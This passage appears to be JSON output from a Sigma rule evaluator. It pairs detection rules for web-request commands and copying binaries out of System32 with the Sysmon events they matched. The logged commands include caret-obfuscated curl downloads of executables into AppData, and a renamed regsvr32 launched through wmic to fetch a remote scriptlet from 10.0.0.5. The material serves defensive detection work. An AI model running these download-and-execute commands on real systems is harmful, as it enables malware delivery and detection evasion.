    {
      "row_id": 195,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207683,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_491.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1C9-6A2E-F80D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:15:53.440733Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:15:53.437",
      "Version": 5
    },
    {
      "row_id": 197,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207727,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_492.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1DE-6A2E-0E0E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:16:14.994763Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:16:14.990",
      "Version": 5
    },
    {
      "row_id": 205,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207948,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_500.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E261-6A2E-790E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:18:25.953268Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:25.949",
      "Version": 5
    },
    {
      "row_id": 207,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207988,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_501.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E273-6A2E-8D0E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:18:43.522866Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:43.518",
      "Version": 5
    }
  ]
},
{
  "title": "Suspicious Copy From or To System Directory",
  "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
  "description": "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\n",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\cmd.exe' ESCAPE '\\' AND CommandLine LIKE '%copy %' ESCAPE '\\') OR ((Image LIKE '%\\\\powershell.exe' ESCAPE '\\' OR Image LIKE '%\\\\pwsh.exe' ESCAPE '\\') AND (CommandLine LIKE '%copy-item%' ESCAPE '\\' OR CommandLine LIKE '% copy %' ESCAPE '\\' OR CommandLine LIKE '%cpi %' ESCAPE '\\' OR CommandLine LIKE '% cp %' ESCAPE '\\')) OR ((Image LIKE '%\\\\robocopy.exe' ESCAPE '\\' OR Image LIKE '%\\\\xcopy.exe' ESCAPE '\\') OR (OriginalFileName='robocopy.exe' OR OriginalFileName='XCOPY.EXE'))) AND (CommandLine LIKE '%\\\\System32%' ESCAPE '\\' OR CommandLine LIKE '%\\\\SysWOW64%' ESCAPE '\\' OR CommandLine LIKE '%\\\\WinSxS%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1036.003"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 246,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c copy C:\\Windows\\System32\\regsvr32.exe %%TEMP%%\\updater.exe && wmic process call create \"%%TEMP%%\\updater.exe /s /i:http://10.0.0.5/payload.sct scrobj.dll\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 209159,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1114__t1114_022.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E558-6A2E-D610-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:31:05.002967Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:31:04.997",
      "Version": 5
    },
    {
      "row_id": 296,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c copy C:\\Windows\\System32\\regsvr32.exe %%TEMP%%\\updater.exe && wmic process call create \"%%TEMP%%\\updater.exe /s /i:http://10.0.0.5/payload.sct scrobj.dll\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210375,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_003.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E7BA-6A2E-3513-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:41:14.126632Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:41:14.122",
      "Version": 5
    }
  ]
},
{
  "title": "Usage Of Web Request Commands And Cmdlets",
  "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
  "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (CommandLine LIKE '%[System.Net.WebRequest]::create%' ESCAPE '\\' OR CommandLine LIKE '%curl %' ESCAPE '\\' OR CommandLine LIKE '%Invoke-RestMethod%' ESCAPE '\\' OR CommandLine LIKE '%Invoke-WebRequest%' ESCAPE '\\' OR CommandLine LIKE '% irm %' ESCAPE '\\' OR CommandLine LIKE '%iwr %' ESCAPE '\\' OR CommandLine LIKE '%Net.WebClient%' ESCAPE '\\' OR CommandLine LIKE '%Resume-BitsTransfer%' ESCAPE '\\' OR CommandLine LIKE '%Start-BitsTransfer%' ESCAPE '\\' OR CommandLine LIKE '%wget %' ESCAPE '\\' OR CommandLine LIKE '%WinHttp.WinHttpRequest%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 72,
  "matches": [
    {
      "row_id": 98,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 202920,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_006.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D2EA-6A2E-9C04-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:12:26.453529Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:26.411",
      "Version": 5
    },
    {
      "row_id": 99,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 202921,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_006.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D2EA-6A2E-9C04-000000002C00",
      "ParentProcessId": 8996,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D2EA-6A2E-9D04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:12:26.544027Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:26.493",
      "Version": 5
    },
    {
      "row_id": 100,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 202958,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_007.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D300-6A2E-AF04-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:12:48.737136Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:48.702",
      "Version": 5
    },
    {
      "row_id": 101,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 202959,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_007.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D300-6A2E-AF04-000000002C00",
      "ParentProcessId": 108,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D300-6A2E-B004-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:12:48.777152Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:48.754",
      "Version": 5
    },
    {
      "row_id": 102,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl h^tt^ps://example.com/file.exe -o %%AP^PDATA%%\\file.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203020,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_010.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D325-6A2E-CE04-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:13:25.381118Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:25.358",
      "Version": 5
    },
    {
      "row_id": 103,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://example.com/file.exe -o %%APPDATA%%\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203021,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_010.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D325-6A2E-CE04-000000002C00",
      "ParentProcessId": 5884,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D325-6A2E-CF04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:13:25.432920Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:25.407",
      "Version": 5
    },
    {
      "row_id": 104,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl h^tt^ps://example.com/file.exe -o %%AP^PDATA%%\\file.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203060,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
